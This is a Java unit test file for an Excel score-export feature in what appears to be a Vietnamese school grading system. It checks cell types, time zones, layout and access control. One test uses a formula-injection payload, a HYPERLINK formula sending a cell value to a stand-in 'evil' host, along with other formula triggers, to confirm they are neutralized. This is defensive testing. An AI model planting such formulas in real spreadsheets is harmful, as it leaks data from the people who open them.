package com.sep.vox.application.usecase.assessmentgrading;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.sep.vox.domain.model.assessment.AssessmentKind;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.math.BigDecimal;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.OffsetDateTime;
import java.util.List;
import java.util.UUID;
import java.util.stream.IntStream;

import org.apache.poi.ss.usermodel.Cell;
import org.apache.poi.ss.usermodel.CellType;
import org.apache.poi.ss.usermodel.Row;
import org.apache.poi.ss.usermodel.Sheet;
import org.apache.poi.ss.usermodel.Workbook;
import org.apache.poi.ss.usermodel.WorkbookFactory;
import org.apache.poi.xssf.usermodel.XSSFSheet;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import com.sep.vox.application.exception.ForbiddenException;
import com.sep.vox.application.mapper.assessmentgrading.GradingResultCode;
import com.sep.vox.application.port.input.query.ExportAssessmentScoresQuery;
import com.sep.vox.application.port.input.service.AssessmentGradingAccessService;
import com.sep.vox.application.port.input.service.AssessmentScoreExportSupport;
import com.sep.vox.application.port.input.usecase.assessmentgrading.ExportAssessmentScoresExcelUseCase;
import com.sep.vox.application.query.dto.AssessmentScoreRowInfo;
import com.sep.vox.application.query.dto.GradingAssignmentFilter;
import com.sep.vox.application.query.repository.AssessmentGradingQueryRepository;
import com.sep.vox.infrastructure.service.PoiSpreadsheetWriterService;

/**
 * Bản .xlsx bỏ được BOM và quote của CSV, nhưng KHÔNG bỏ được guard công thức: rủi ro nằm
 * ở lúc Excel đọc ô chứ không ở cách file được mã hoá. Lý do tồn tại của bản Excel là các ô
 * có KIỂU thật — nên "điểm là ô số", "thời gian là ô ngày" chính là thứ phải test.
 *
 * <p>Đọc ngược file bằng POI thay vì so chuỗi: .xlsx là một file zip, so byte không nói
 * được gì về thứ người dùng nhìn thấy.
 */
class ExportAssessmentScoresExcelUseCaseTests {

    private AssessmentGradingQueryRepository assessmentGradingQueryRepository;
    private AssessmentGradingAccessService assessmentGradingAccessService;
    private ExportAssessmentScoresExcelUseCase useCase;

    private final UUID adminId = UUID.randomUUID();
    private final UUID schoolId = UUID.randomUUID();
    private final UUID assessmentId = UUID.randomUUID();
    private final UUID candidateResultId = UUID.randomUUID();

    @BeforeEach
    void setUp() {
        assessmentGradingQueryRepository = mock(AssessmentGradingQueryRepository.class);
        assessmentGradingAccessService = mock(AssessmentGradingAccessService.class);
        useCase = new ExportAssessmentScoresExcelUseCase(
            new AssessmentScoreExportSupport(assessmentGradingQueryRepository, assessmentGradingAccessService),
            new PoiSpreadsheetWriterService());

        when(assessmentGradingAccessService.requireActiveUserId()).thenReturn(adminId);
        when(assessmentGradingAccessService.requireCurrentSchoolId(adminId)).thenReturn(schoolId);
        when(assessmentGradingQueryRepository.findScoreRows(any())).thenReturn(List.of());
    }

    private void givenRow(String studentName, BigDecimal totalScore, Instant releasedAt) {
        when(assessmentGradingQueryRepository.findScoreRows(any())).thenReturn(List.of(
            new AssessmentScoreRowInfo(candidateResultId, studentName, "hs@example.com", "12A1",
                "IELTS Mock", OffsetDateTime.parse("2026-07-12T08:00:00+07:00").toInstant(),
                totalScore, "B2", "RELEASED", "INITIAL", "UPHELD", "Cô Lan", releasedAt)));
    }

    private Sheet export() {
        return sheetOf(useCase.execute(ExportAssessmentScoresQuery.scopedTo(assessmentId, null, null)));
    }

    private Sheet sheetOf(byte[] bytes) {
        try (Workbook workbook = WorkbookFactory.create(new ByteArrayInputStream(bytes))) {
            // The workbook is closed after leaving the try, so reading the whole sheet into memory
            // beforehand is not feasible -- POI lets you keep a sheet reference of a closed
            // workbook once the data has been loaded, and every assertion below only reads cell
            // values.
            return workbook.getSheetAt(0);
        } catch (IOException exception) {
            throw new IllegalStateException("Không đọc lại được file xuất ra", exception);
        }
    }

    private GradingAssignmentFilter capturedFilter() {
        ArgumentCaptor<GradingAssignmentFilter> captor = ArgumentCaptor.forClass(GradingAssignmentFilter.class);
        verify(assessmentGradingQueryRepository).findScoreRows(captor.capture());
        return captor.getValue();
    }

    @Test
    void should_write_the_thirteen_vietnamese_headers_in_order() {
        Row header = export().getRow(0);

        assertThat(header.getLastCellNum()).isEqualTo((short) 13);
        assertThat(cellTexts(header)).containsExactly(
            "Mã bài", "Họ tên", "Email", "Lớp", "Kỳ thi", "Ca thi", "Điểm", "Xếp loại",
            "Trạng thái", "Vòng chấm cuối", "Kết luận", "Người chấm", "Thời điểm công bố");
    }

    private List<String> cellTexts(Row row) {
        return IntStream.range(0, row.getLastCellNum())
            .mapToObj(index -> row.getCell(index).getStringCellValue())
            .toList();
    }

    /** The reason the Excel version exists: this column must be sortable and averageable. */
    @Test
    void should_write_the_score_as_a_real_number_cell() {
        givenRow("Nguyễn Văn A", new BigDecimal("7.50"), null);

        Cell cell = export().getRow(1).getCell(6);

        assertThat(cell.getCellType()).isEqualTo(CellType.NUMERIC);
        assertThat(cell.getNumericCellValue()).isEqualTo(7.5);
    }

    /** Chưa có điểm phải là ô TRỐNG — ghi 0 là biến "chưa chấm" thành "được 0 điểm". */
    @Test
    void should_leave_the_score_blank_when_it_is_missing() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(export().getRow(1).getCell(6).getCellType()).isEqualTo(CellType.BLANK);
    }

    @Test
    void should_write_the_sitting_time_as_a_date_cell_in_vietnam_time() {
        givenRow("Nguyễn Văn A", new BigDecimal("7.50"), null);

        Cell cell = export().getRow(1).getCell(5);

        assertThat(cell.getCellType()).isEqualTo(CellType.NUMERIC);
        // The source is 08:00+07:00; what is read back must be 08:00 no matter which time zone the
        // JVM runs in.
        assertThat(cell.getLocalDateTimeCellValue())
            .isEqualTo(LocalDateTime.of(2026, 7, 12, 8, 0));
    }

    @Test
    void should_write_the_release_time_in_vietnam_time_too() {
        givenRow("Nguyễn Văn A", new BigDecimal("7.50"),
            OffsetDateTime.parse("2026-07-20T03:30:00Z").toInstant());

        assertThat(export().getRow(1).getCell(12).getLocalDateTimeCellValue())
            .isEqualTo(LocalDateTime.of(2026, 7, 20, 10, 30));
    }

    @Test
    void should_neutralize_a_cell_that_starts_like_a_formula() {
        givenRow("=HYPERLINK(\"http://evil/?x=\"&A1,\"Nhấn vào đây\")", null, null);

        // Dấu nháy đơn phía trước là thứ ngăn Excel CHẠY ô này lúc mở file.
        assertThat(export().getRow(1).getCell(1).getStringCellValue()).startsWith("'=HYPERLINK(");
    }

    @Test
    void should_neutralize_the_other_formula_triggers_too() {
        for (String trigger : List.of("+", "-", "@")) {
            givenRow(trigger + "cmd", null, null);

            assertThat(export().getRow(1).getCell(1).getStringCellValue())
                .isEqualTo("'" + trigger + "cmd");
        }
    }

    @Test
    void should_neutralize_a_tab_and_a_carriage_return_trigger_too() {
        for (String trigger : List.of("\t", "\r")) {
            givenRow(trigger + "cmd", null, null);

            assertThat(export().getRow(1).getCell(1).getStringCellValue()).isEqualTo("'" + trigger + "cmd");
        }
    }

    @Test
    void should_format_date_cells_as_hour_minute_day_month_year() {
        givenRow("Nguyễn Văn A", new BigDecimal("7.50"), null);

        assertThat(export().getRow(1).getCell(5).getCellStyle().getDataFormatString())
            .isEqualTo("HH:mm dd/MM/yyyy");
    }

    @Test
    void should_leave_a_missing_release_time_blank() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(export().getRow(1).getCell(12).getCellType()).isEqualTo(CellType.BLANK);
    }

    @Test
    void should_freeze_the_header_row() {
        assertThat(export().getPaneInformation().getHorizontalSplitPosition()).isEqualTo((short) 1);
        assertThat(export().getPaneInformation().getVerticalSplitPosition()).isZero();
    }

    @Test
    void should_put_an_auto_filter_over_the_header_and_the_data_rows() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(autoFilterRange(export())).isEqualTo("A1:M2");
    }

    @Test
    void should_keep_the_auto_filter_on_a_header_only_sheet() {
        assertThat(autoFilterRange(export())).isEqualTo("A1:M2");
    }

    private String autoFilterRange(Sheet sheet) {
        return ((XSSFSheet) sheet).getCTWorksheet().getAutoFilter().getRef();
    }

    @Test
    void should_cap_a_column_at_sixty_characters() {
        givenRow("N".repeat(300), null, null);

        assertThat(export().getColumnWidth(1)).isEqualTo(60 * 256);
    }

    @Test
    void should_leave_an_ordinary_name_untouched() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(export().getRow(1).getCell(1).getStringCellValue()).isEqualTo("Nguyễn Văn A");
    }

    @Test
    void should_write_the_short_result_code() {
        givenRow("Nguyễn Văn A", null, null);

        assertThat(export().getRow(1).getCell(0).getStringCellValue())
            .isEqualTo(GradingResultCode.of(candidateResultId));
    }

    @Test
    void should_produce_a_header_only_sheet_when_there_is_no_result() {
        assertThat(export().getLastRowNum()).isZero();
    }

    @Test
    void should_require_an_assessment_or_a_schedule_scope() {
        assertThatThrownBy(() -> useCase.execute(ExportAssessmentScoresQuery.scopedTo(null, null, null)))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("kỳ thi hoặc ca thi");

        verify(assessmentGradingQueryRepository, never()).findScoreRows(any());
    }

    @Test
    void should_reject_a_caller_without_access_to_the_assessment() {
        doThrow(new ForbiddenException("BẢO MẬT: Bạn không có quyền thao tác trên bài kiểm tra này."))
            .when(assessmentGradingAccessService)
            .authorizeSchoolAdminOrClassTestChair(schoolId, assessmentId, adminId);

        assertThatThrownBy(() -> useCase.execute(ExportAssessmentScoresQuery.scopedTo(assessmentId, null, null)))
            .isInstanceOf(ForbiddenException.class);

        verify(assessmentGradingQueryRepository, never()).findScoreRows(any());
    }

    @Test
    void should_pass_the_class_test_kind_through() {
        useCase.execute(ExportAssessmentScoresQuery.scopedTo(assessmentId, null, AssessmentKind.CLASS_TEST));

        assertThat(capturedFilter().assessmentKind()).isEqualTo("CLASS_TEST");
    }

    @Test
    void should_default_the_assessment_kind_to_centralized() {
        useCase.execute(ExportAssessmentScoresQuery.scopedTo(assessmentId, null, null));

        assertThat(capturedFilter().assessmentKind()).isEqualTo("CENTRALIZED");
    }

    @Test
    void should_name_the_file_after_the_assessment_kind() {
        assertThat(useCase.exportFileName(AssessmentKind.CLASS_TEST))
            .startsWith("bang-diem-lop-").endsWith(".xlsx");
        assertThat(useCase.exportFileName(AssessmentKind.CENTRALIZED))
            .startsWith("bang-diem-tap-trung-").endsWith(".xlsx");
        // Tên file đi vào header HTTP: phải là ASCII thuần, không dấu.
        assertThat(useCase.exportFileName(null)).matches("[\\x20-\\x7E]+");
    }
}
